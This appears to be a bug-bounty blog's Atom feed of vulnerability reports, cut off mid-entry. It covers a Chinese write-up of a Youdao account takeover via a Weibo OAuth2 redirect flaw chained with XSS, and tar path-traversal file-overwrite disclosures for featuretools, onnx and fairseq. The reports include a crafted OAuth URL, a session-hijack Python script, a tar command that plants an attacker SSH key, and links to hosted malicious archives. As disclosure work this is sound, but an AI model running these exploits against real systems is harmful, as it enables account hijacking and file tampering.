<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-04-09T15:30:26+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">高危：有道智云存在微博OAuth2登录缺陷串联XSS漏洞实现账户劫持(忽略!)</title><link href="http://localhost:4000/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover.html" rel="alternate" type="text/html" title="高危：有道智云存在微博OAuth2登录缺陷串联XSS漏洞实现账户劫持(忽略!)" /><published>2024-04-09T10:26:18+08:00</published><updated>2024-04-09T10:26:18+08:00</updated><id>http://localhost:4000/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover</id><content type="html" xml:base="http://localhost:4000/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>有道智云存在微博OAuth2登录缺陷, 串联XSS漏洞实现账户劫持(对业务影响小，忽略hh)</p>
</blockquote>

<h2 id="weakness">Weakness</h2>
<blockquote>
  <p>account takeover</p>
</blockquote>

<h2 id="severity">Severity</h2>
<blockquote>
  <p>High, 9.5</p>
</blockquote>

<h2 id="url">URL</h2>
<ul>
  <li>
    <p>POC网页: <a href="https://api.weibo.com/oauth2/authorize?response_type=code&amp;client_id=1230490736&amp;redirect_uri=https%3A%2F%2Fnote.youdao.com%2Fcoshare%2Findex.html%3Ftoken%3DC47998CE491248EFAE31401AAD4B00BF%26gid%3D149090401%26_time%3D171263020522&amp;forcelogin=true###">https://api.weibo.com/oauth2/authorize?response_type=code&amp;client_id=1230490736&amp;redirect_uri=https%3A%2F%2Fnote.youdao.com%2Fcoshare%2Findex.html%3Ftoken%3DC47998CE491248EFAE31401AAD4B00BF%26gid%3D149090401%26_time%3D171263020522&amp;forcelogin=true###</a></p>
  </li>
  <li>
    <p>视频链接：<a href="https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw">https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw</a> 提取码：1314</p>
  </li>
</ul>

<h2 id="key-payload">Key Payload</h2>

<p>OAuth2登录请求，其中code参数是攻击者截获的微博认证code：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /login-weibo-redirect.s?code=58590295c78da0b3f1141b7bdcb5bc4f HTTP/1.1
Host: ai.youdao.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://api.weibo.com/
Cookie: JSESSIONID_NEW=5f715da6-a7c5-4638-8401-4a7e64330d93
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
</code></pre></div></div>

<h2 id="summary">Summary</h2>

<p>网易有道智云平台的登录有几种认证方式，其中之一是微博的OAuth2登录：</p>

<ol>
  <li>用户选择微博登录后，会跳转到微博的登录认证界面，并要求用户扫码登录。但是该OAuth2没有state参数，仅有redirect参数，并且该参数的跳转链接为在任何youdao.com域名的链接。</li>
  <li>当攻击者在youdao.com域名下找到xss漏洞后，攻击者能够设置redirect参数为xss漏洞页面，微博将code追加到xss链接之后，让攻击者通过xss读取该链接即可获取weibo token。</li>
  <li>攻击者获取code后，通过code能够获取认证服务器返回的JSESSIONID_NEW cookie。通过该cookie能够登录受害者账户，实现账户劫持。</li>
</ol>

<h4 id="trigger">Trigger</h4>
<ol>
  <li>
    <p>首先利用先前找到的有道云协作markdown渲染XSS漏洞，该漏洞是markdown在渲染classDiagram类图时，未对node名称进行过滤，从而触发xss漏洞。并且markdown可以分享，例如分享xss链接为：<a href="https://note.youdao.com/coshare/index.html?token=C47998CE491248EFAE31401AAD4B00BF&amp;gid=149090401&amp;_time=1712630205225">https://note.youdao.com/coshare/index.html?token=C47998CE491248EFAE31401AAD4B00BF&amp;gid=149090401&amp;_time=1712630205225</a></p>

    <p><img src="/assets/youdaoai/xiezuo.png" alt="xiezuo" /></p>

    <p><img src="/assets/youdaoai/xiezuoxss.png" alt="xiezuoxss" /></p>
  </li>
  <li>
    <p>受害者：注册网易有道智云平台账号，<a href="https://ai.youdao.com/login.s">https://ai.youdao.com/login.s</a>。并且进入账号设置，绑定微博账号。</p>

    <p>登录和注册：</p>

    <p><img src="/assets/youdaoai/register.png" alt="reg" /></p>

    <p>微博绑定：</p>

    <p><img src="/assets/youdaoai/weibo.png" alt="weibo" /></p>
  </li>
  <li>
    <p>攻击者：打开通过微博登录链接，跳转到微博OAuth2验证界面，该界面提供二维码，用户通过微博app扫描即可登录。我们分析一下该验证界面的链接。</p>

    <p>微博登录入口：</p>

    <p><img src="/assets/youdaoai/weibodenglu.png" alt="weibod" /></p>

    <p>微博扫码登录界面：</p>

    <p><img src="/assets/youdaoai/weiboauth.png" alt="weiboa" /></p>

    <p>分析微博验证界面的url链接：</p>

    <p>https://api.weibo.com/oauth2/authorize?response_type=code&amp;client_id=1230490736&amp;redirect_uri=https%3A%2F%2Fai.youdao.com%2Flogin-weibo-redirect.s&amp;forcelogin=true###</p>

    <p>可以看到OAuth2的返回token是<code class="language-plaintext highlighter-rouge">code</code>类型，<code class="language-plaintext highlighter-rouge">redirect_uri</code>指向<code class="language-plaintext highlighter-rouge">https://ai.youdao.com/login-weibo-redirect.s</code>，未提供<code class="language-plaintext highlighter-rouge">state</code>参数，说明验证仅仅依靠code和跳转链接。只需要将跳转链接设置为攻击者控制的链接，就能够获取验证token。</p>
  </li>
  <li>
    <p>笔者测试发现，redirect_uri仅仅验证了是否为youdao.com域名，子域名、路径等等都未验证，由此，攻击者只需要将该跳转链接设置为包含xss漏洞的链接即可截获token。</p>

    <p>youdao.com域名下的xss漏洞链接：</p>

    <p>https://note.youdao.com/coshare/index.html?token=C47998CE491248EFAE31401AAD4B00BF&amp;gid=149090401&amp;_time=1712630205225</p>

    <p>将上述链接urlencode后替换redirect_uri值：</p>

    <p>https://api.weibo.com/oauth2/authorize?response_type=code&amp;client_id=1230490736&amp;redirect_uri=https%3A%2F%2Fnote.youdao.com%2Fcoshare%2Findex.html%3Ftoken%3DC47998CE491248EFAE31401AAD4B00BF%26gid%3D149090401%26_time%3D171263020522&amp;forcelogin=true###</p>

    <p>打开上述链接，并且将二维码发送给受害者，让其用微博扫描后：</p>

    <p><img src="/assets/youdaoai/redirect.png" alt="re" /></p>

    <p>跳转到攻击者控制的XSS页面，该xxs将发送code到远程服务器：</p>

    <p><img src="/assets/youdaoai/weibotoken.png" alt="xss" /></p>

    <p><img src="/assets/youdaoai/webhook2.png" alt="webhook" /></p>
  </li>
  <li>
    <p>攻击者获取微博token后，分以下几个步骤获取受害者的session cookie,和jwt token:</p>

    <p>第一步：将code发送后台服务器，get url为：https://ai.youdao.com/login-weibo-redirect.s?code=xxx ，服务器验证code合法后返回 <code class="language-plaintext highlighter-rouge">JSESSIONID_NEW</code> cookie作为session cookie。</p>

    <p><img src="/assets/youdaoai/sessioncookie.png" alt="sess" /></p>

    <p>第二步：将第一步的cookie设置到后续请求中，然后调用微博登录接口：post url为：https://ai.youdao.com/login-weibo.s</p>

    <p><img src="/assets/youdaoai/loginweibo.png" alt="login" /></p>

    <p>第三步：调用get url请求：https://ai.youdao.com/consoleApi/ABTest/checkUser ，获取jwt token。</p>

    <p><img src="/assets/youdaoai/getjwt.png" alt="getjwt" /></p>

    <p>第四步：获取受害者账户信息，调用post url请求：https://ai.youdao.com/consoleApi/user/getUserInfo ,成功返回信息。</p>

    <p><img src="/assets/youdaoai/getuserinfo.png" alt="getuser" /></p>
  </li>
  <li>
    <p>为自动化上述过程，笔者提供自动化脚本供测试：</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> import requests
 import sys

 weiboCode= "weibo_code"
 # 1. login-weibo-redirect.s
 url = "https://ai.youdao.com/login-weibo-redirect.s?code="
 payload = {}
 headers = {
 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
 'Cookie':'f1194a72-cdcc-48ca-86bb-5d33f3ff667e'
 }
 response = requests.request("GET", url + weiboCode, headers=headers, data=payload)
 cookies = response.headers['Set-Cookie']

 JSESSIONID_NEW = None
 if cookies:
     cookie_strings = cookies.split(';')
     for cookie_string in cookie_strings:
         cookie_parts = cookie_string.strip().split('=')
         if len(cookie_parts) == 2 and cookie_parts[0] == 'JSESSIONID_NEW':
             JSESSIONID_NEW = cookie_parts[1]
             print("Cookie Value:", JSESSIONID_NEW)
             break

 if not JSESSIONID_NEW:
     print("no JSESSIONID_NEW found")
     sys.exit()

 print("################get JSESSIONID_NEW###############")
 print(JSESSIONID_NEW)


 # 2. login-weibo.s 
 url = "https://ai.youdao.com/login-weibo.s"

 payload = {}
 headers = {
 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
 'Cookie':'JSESSIONID_NEW='+JSESSIONID_NEW+'; csrfToken=e9f3e7f6',
 'Origin': 'https://ai.youdao.com',
 'Sec-Fetch-Site': 'same-origin'
 }
 response = requests.request("POST", url, headers=headers, data=payload)

 # /consoleApi/ABTest/checkUser
 url = "https://ai.youdao.com/consoleApi/ABTest/checkUser"
 payload = {}
 response = requests.request("GET", url, headers=headers, data=payload)
 Authorization = response.headers['Authorization']
 print("################Authorization###############")
 print(Authorization)

 # /consoleApi/user/getUserInfo
 url = "https://ai.youdao.com/consoleApi/user/getUserInfo"
 payload = {}
 response = requests.request("POST", url, headers=headers, data=payload)
 print("################getUserInfo###############")
 print(response.text)
</code></pre></div>    </div>
  </li>
</ol>

<h3 id="proof">Proof</h3>
<p>请提供截图或视频</p>

<p>链接：<a href="https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw">https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw</a>
提取码：1314</p>

<h2 id="impact">Impact</h2>

<p>该漏洞影响所有绑定了微博账户的有道智云用户，只要受害者用微博扫描攻击者发送的二维码，即可实现有道智云账户的劫持攻击。</p>

<h2 id="patch-advice">Patch advice</h2>

<ol>
  <li>对微博OAuth2设置state参数，并且限定redirect url。</li>
</ol>]]></content><author><name></name></author><category term="account-takeover" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Huntr: Arbitrary File Overwrite in read_entityset api</title><link href="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx-copy.html" rel="alternate" type="text/html" title="Huntr: Arbitrary File Overwrite in read_entityset api" /><published>2024-04-07T10:31:06+08:00</published><updated>2024-04-07T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx%20copy</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx-copy.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Huntr: Arbitrary File Overwrite in read_entityset api in featuretools</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="description">Description</h2>

<p>The <a href="https://featuretools.alteryx.com/en/stable/generated/featuretools.read_entityset.html#featuretools.read_entityset">featuretools.read_entityset</a> function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar files that can overwrite any file. This leads directly to a high impact regarding the integrity of files. An attacker could also abuse this to impact the availability, by deleting system files, personal files, or application files. Remote code execution is also possible through various means.</p>

<p>The vulnerable function is exposed through the <code class="language-plaintext highlighter-rouge">featuretools.read_entityset</code> function, which can be imported easily. It’s an api used to read data_description.json from directory on disk, S3 path, or URL which is tar file.</p>

<p>This code snippet shows how the <code class="language-plaintext highlighter-rouge">read_entityset</code> function extracts a tar file downloaded from internet without performing any security checks.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def read_entityset(path, profile_name=None, **kwargs):
    """Read entityset from disk, S3 path, or URL.

    Args:
        path (str): Directory on disk, S3 path, or URL to read `data_description.json`.
        profile_name (str, bool): The AWS profile specified to write to S3. Will default to None and search for AWS credentials.
            Set to False to use an anonymous profile.
        kwargs (keywords): Additional keyword arguments to pass as keyword arguments to the underlying deserialization method.
    """
    if _is_url(path) or _is_s3(path) or _is_local_tar(str(path)):
        with tempfile.TemporaryDirectory() as tmpdir:
            local_path = path
            transport_params = None

            if _is_s3(path):
                transport_params = get_transport_params(profile_name)

            if _is_s3(path) or _is_url(path):
                local_path = os.path.join(tmpdir, "temporary_es")
                use_smartopen_es(local_path, path, transport_params) # download file from url!
            ### tar file extracted to tepdir without any security checks ###
            with tarfile.open(str(local_path)) as tar:
                tar.extractall(path=tmpdir)

            data_description = read_data_description(tmpdir)
            return description_to_entityset(data_description, **kwargs)
    else:
        data_description = read_data_description(path)
        return description_to_entityset(data_description, **kwargs)
</code></pre></div></div>

<p>The Python documentation explains us that tarfiles may have absolute filenames starting with / which could overwite files in system.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: Never extract archives from untrusted sources without prior inspection. 
It is possible that files are created outside of path, 
e.g. members that have absolute filenames starting with "/" or filenames with two dots "..".
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>An attacker can create a malicous tar file using following command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar --absolute-names -cvf hack.tar /home/kali/.ssh/authorized_keys
</code></pre></div></div>

<p>Then, the attacker will upload the <code class="language-plaintext highlighter-rouge">hack.tar</code> to public server.</p>

<p>I have uploaded one malicous tar file for testing: <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack.tar">https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack.tar</a></p>

<p>If anyone now downloads tar using <code class="language-plaintext highlighter-rouge">read_entityset</code> api, causing automatically extracting the malicous tar file and overwrite files silently.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import featuretools as ft
ft.read_entityset(path="https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack.tar")
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/kali/.ssh/authorized_keys
ssh-rsa xxx hacker@test.com
</code></pre></div></div>

<p>Tested on Google Colab: <a href="https://colab.research.google.com/drive/1qc7qg_VPPHKVOUT-xhSygg2M7mwDdVTt?usp=sharing">https://colab.research.google.com/drive/1qc7qg_VPPHKVOUT-xhSygg2M7mwDdVTt?usp=sharing</a></p>

<p><img src="https://live.staticflickr.com/65535/53637853744_26b8a5fff7_h.jpg" alt="poc" /></p>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>

<h3 id="ssh-access">SSH Access</h3>

<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>

<h3 id="web-servers">Web Servers</h3>

<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>

<h2 id="reference">Reference</h2>

<p><a href="https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89">https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89</a></p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/alteryx/featuretools/blob/21d0bf0915238ba6c6bc1e958b9a91b209f88de5/featuretools/entityset/deserialize.py#L170">https://github.com/alteryx/featuretools/blob/21d0bf0915238ba6c6bc1e958b9a91b209f88de5/featuretools/entityset/deserialize.py#L170</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Huntr: Arbitrary File Overwrite in onnx</title><link href="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx.html" rel="alternate" type="text/html" title="Huntr: Arbitrary File Overwrite in onnx" /><published>2024-04-07T10:31:06+08:00</published><updated>2024-04-07T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Huntr: Arbitrary File Overwrite in onnx</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="description">Description</h2>

<p>The <a href="https://onnx.ai/onnx/api/hub.html#download-model-with-test-data">download_model_with_test_data</a> function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar files that can overwrite any file. This leads directly leads to a high impact regarding the integrity of files. An attacker could also abuse this to impact the availability, by deleting system files, personal files, or application files. Remote code execution is also possible through various means.</p>

<p>The vulnerable function is exposed through the <code class="language-plaintext highlighter-rouge">download_model_with_test_data</code> function, which is further used in the onnx framework, as well as can be imported easily.</p>

<p>This code snippet shows how the <code class="language-plaintext highlighter-rouge">download_model_with_test_data</code> function extracts a tar file downloaded from internet without performing any security checks.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def download_model_with_test_data(
    model: str,
    repo: str = "onnx/models:main", # change to attacker's repo
    opset: Optional[int] = None,
    force_reload: bool = False,
    silent: bool = False, # set silent to True
) -&gt; Optional[str]:
    selected_model = get_model_info(model, repo, opset)

    local_model_with_data_path_arr = selected_model.metadata[
        "model_with_data_path"
    ].split("/")

    model_with_data_sha = selected_model.metadata["model_with_data_sha"]
    ...
    local_model_with_data_path = join(
        _ONNX_HUB_DIR, os.sep.join(local_model_with_data_path_arr)
    )

    if force_reload or not os.path.exists(local_model_with_data_path):
        os.makedirs(os.path.dirname(local_model_with_data_path), exist_ok=True)
        lfs_url = _get_base_url(repo, True)
        print(f"Downloading {model} to local path {local_model_with_data_path}")
        _download_file( # download model from github repository
            lfs_url + selected_model.metadata["model_with_data_path"],
            local_model_with_data_path,
        )
    else:
        print(f"Using cached {model} model from {local_model_with_data_path}")

    with open(local_model_with_data_path, "rb") as f:
        model_with_data_bytes = f.read()

    with tarfile.open(local_model_with_data_path) as model_with_data_zipped:
        # FIXME: Avoid index manipulation with magic numbers
        local_model_with_data_dir_path = local_model_with_data_path[
            0 : len(local_model_with_data_path) - 7
        ]
        model_with_data_zipped.extractall(local_model_with_data_dir_path) # just extract without any security checks

    return model_with_data_path
</code></pre></div></div>

<p>The Python documentation explains us that tarfiles may also have absolute filenames starting with / which could overwite files in system.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: Never extract archives from untrusted sources without prior inspection. 
It is possible that files are created outside of path, 
e.g. members that have absolute filenames starting with "/" or filenames with two dots "..".
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>An attacker can create a malicous tar file using following command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar --absolute-names -cvf hack.tar.gz /home/kali/.ssh/authorized_keys
</code></pre></div></div>

<p>Then, the attacker will upload the <code class="language-plaintext highlighter-rouge">hack.tar.gz</code> as onnx model to his own github repository. Besides, create file <code class="language-plaintext highlighter-rouge">ONNX_HUB_MANIFEST.json</code> with tar file path(<code class="language-plaintext highlighter-rouge">model_with_data_path</code>) and sha256 value(<code class="language-plaintext highlighter-rouge">model_with_data_sha</code>).</p>

<p>Create malicious model repo:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git lfs track "*.gz"
git add .
git commit -m 'add gz lfs models'
git push
</code></pre></div></div>

<p>the <code class="language-plaintext highlighter-rouge">ONNX_HUB_MANIFEST.json</code> metadata file example:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[
    {
        "model": "MNIST",
        "model_path": "validated/mnist-8.onnx",
        "onnx_version": "1.3",
        "opset_version": 8,
        "metadata": {
            "model_sha": "",
            "model_bytes": 26454,
            "tags": [
                "vision",
                "classification",
                "mnist"
            ],
            "io_ports": {
                "inputs": [
                    {
                        "name": "Input3",
                        "shape": [
                            1,
                            1,
                            28,
                            28
                        ],
                        "type": "tensor(float)"
                    }
                ],
                "outputs": [
                    {
                        "name": "Plus214_Output_0",
                        "shape": [
                            1,
                            10
                        ],
                        "type": "tensor(float)"
                    }
                ]
            },
            "model_with_data_path": "validated/hack.tar.gz",
            "model_with_data_sha": "786bb632aab30bb574f7f2bab991c56c7707f8d224845f85a16bce32e7980cac",
            "model_with_data_bytes": 26751
        }
    }
]
</code></pre></div></div>
<p>I have create one malicous repo for testing: <a href="https://github.com/sunriseXu/onnx">https://github.com/sunriseXu/onnx</a></p>

<p>If anyone now downloads model from online github repository, and <code class="language-plaintext highlighter-rouge">download_model_with_test_data</code> will extract the malicous tar file and overwrite files specified in tarfile by absolute path silently.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from onnx import ModelProto, hub
hub.download_model_with_test_data("mnist",repo="sunriseXu/onnx",force_reload=True,silent=True)
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/kali/.ssh/authorized_keys
ssh-rsa xxx hacker@test.com
</code></pre></div></div>

<p>tested in google colab: <a href="https://colab.research.google.com/drive/1m1iJcfp-dETTr013HyYaYJsdetBa-7YA?usp=sharing">https://colab.research.google.com/drive/1m1iJcfp-dETTr013HyYaYJsdetBa-7YA?usp=sharing</a></p>

<p><img src="https://raw.githubusercontent.com/sunriseXu/onnx/main/img/poc.png" alt="poc1" /></p>

<p><img src="https://raw.githubusercontent.com/sunriseXu/onnx/main/img/poc2.png" alt="poc2" /></p>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>

<p>SSH Access
On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>

<p>Web Servers
On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>

<h2 id="reference">Reference</h2>

<p><a href="https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89">https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89</a></p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/onnx/onnx/blob/4128a09009aa67622c6308c82fe4199813a71682/onnx/hub.py#L369">https://github.com/onnx/onnx/blob/4128a09009aa67622c6308c82fe4199813a71682/onnx/hub.py#L369</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Arbitrary File Overwrite and Arbitrary Folder Delete in from_pretrained api</title><link href="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-facebook-fairseq.html" rel="alternate" type="text/html" title="Arbitrary File Overwrite and Arbitrary Folder Delete in from_pretrained api" /><published>2024-04-07T10:31:06+08:00</published><updated>2024-04-07T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-facebook-fairseq</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-facebook-fairseq.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Arbitrary File Overwrite in from_pretrained api in facebook fairseq</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="description">Description</h2>

<p>The <a href="https://fairseq.readthedocs.io/en/latest/models.html?highlight=from_pretrained#fairseq.models.BaseFairseqModel.from_pretrained">from_pretrained</a> function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar files that can overwrite any file. This leads directly to a high impact regarding the integrity of files. An attacker could also abuse this to impact the availability, by deleting system files, personal files, or application files. Remote code execution is also possible through various means.</p>

<p>The vulnerable function is exposed through the <a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/models/fairseq_model.py#L272">BaseFairseqModel.from_pretrained</a> function. It’s an api used to read pretrained from files on disk, S3 path, or URL which is tar file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def from_pretrained(
        cls,
        model_name_or_path,
        checkpoint_file="model.pt",
        data_name_or_path=".",
        **kwargs,
    ):
        from fairseq import hub_utils

        x = hub_utils.from_pretrained(
            model_name_or_path,
            checkpoint_file,
            data_name_or_path,
            archive_map=cls.hub_models(),
            **kwargs,
        )
        logger.info(x["args"])
        return hub_utils.GeneratorHubInterface(x["args"], x["task"], x["models"])
</code></pre></div></div>

<p>and then it calls <a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/hub_utils.py#L23">hub_utils.from_pretrained</a>, in this function, it calls <a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L54">file_utils.load_archive_file</a> to download file from <code class="language-plaintext highlighter-rouge">model_name_or_path</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def from_pretrained(
    model_name_or_path,
    checkpoint_file="model.pt",
    data_name_or_path=".",
    archive_map=None,
    **kwargs
):
    ...
    model_path = file_utils.load_archive_file(model_name_or_path)
</code></pre></div></div>

<p>in <code class="language-plaintext highlighter-rouge">file_utils.load_archive_file</code>, it calls <code class="language-plaintext highlighter-rouge">file_utils.cached_path</code> firstly:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def load_archive_file(archive_file):
    # redirect to the cache, if necessary
    try:
        resolved_archive_file = cached_path(archive_file, cache_dir=None)
    except EnvironmentError:
        logger.info(
            "Archive name '{}' was not found in archive name list. "
            "We assumed '{}' was a path or URL but couldn't find any file "
            "associated to this path or URL.".format(
                archive_file,
                archive_file,
            )
        )
        return None

    if resolved_archive_file == archive_file:
        logger.info("loading archive file {}".format(archive_file))
    else:
        logger.info(
            "loading archive file {} from cache at {}".format(
                archive_file, resolved_archive_file
            )
        )

    # Extract archive to temp dir and replace .tar.bz2 if necessary
    tempdir = None
    if not os.path.isdir(resolved_archive_file):
        tempdir = tempfile.mkdtemp()
        logger.info(
            "extracting archive file {} to temp dir {}".format(
                resolved_archive_file, tempdir
            )
        )
        ext = os.path.splitext(archive_file)[1][1:]
        with tarfile.open(resolved_archive_file, "r:" + ext) as archive:
            top_dir = os.path.commonprefix(archive.getnames())
            archive.extractall(tempdir)
        os.remove(resolved_archive_file)
        shutil.move(os.path.join(tempdir, top_dir), resolved_archive_file)
        shutil.rmtree(tempdir)

    return resolved_archive_file
</code></pre></div></div>

<p>and then in <code class="language-plaintext highlighter-rouge">file_utils.cached_path</code>, when parmeter <code class="language-plaintext highlighter-rouge">url_or_filename</code> is an url, it calls <a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L279">file_utils.get_from_cache</a> to download tar file and save file content in temperary file and return the temperary file path to <code class="language-plaintext highlighter-rouge">file_utils.load_archive_file</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def get_from_cache(url, cache_dir=None):
    ...    
    cache_path = os.path.join(cache_dir, filename)
    if not os.path.exists(cache_path):
        # Download to temporary file, then copy to cache dir once finished.
        # Otherwise you get corrupt cache entries if the download gets interrupted.
        with tempfile.NamedTemporaryFile() as temp_file:
            logger.info("%s not found in cache, downloading to %s", url, temp_file.name)

            # GET file object
            if url.startswith("s3://"):
                s3_get(url, temp_file)
            else:
                ##### Download tar file from url!!!!! #####
                http_get(url, temp_file)

            # we are copying the file before closing it, so flush to avoid truncation
            temp_file.flush()
            # shutil.copyfileobj() starts at the current position, so go to the start
            temp_file.seek(0)
    ...
    return cache_path
</code></pre></div></div>

<p>Back to <code class="language-plaintext highlighter-rouge">file_utils.load_archive_file</code>, the malicious tar file is opened by <code class="language-plaintext highlighter-rouge">tarfile.open</code> and extracted by <code class="language-plaintext highlighter-rouge">archive.extractall</code> without any security checks which is well-known vulnerability. when tar file is compressed by <code class="language-plaintext highlighter-rouge">tar</code> option <code class="language-plaintext highlighter-rouge">--absolute-names</code>, absolute path names and relative path names can be included in tar file. When extracted by <code class="language-plaintext highlighter-rouge">tarfile.extractall</code>, the file with absolute names will overwrite target files silently, causing arbitrary file overwite.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def load_archive_file(archive_file):
    ...
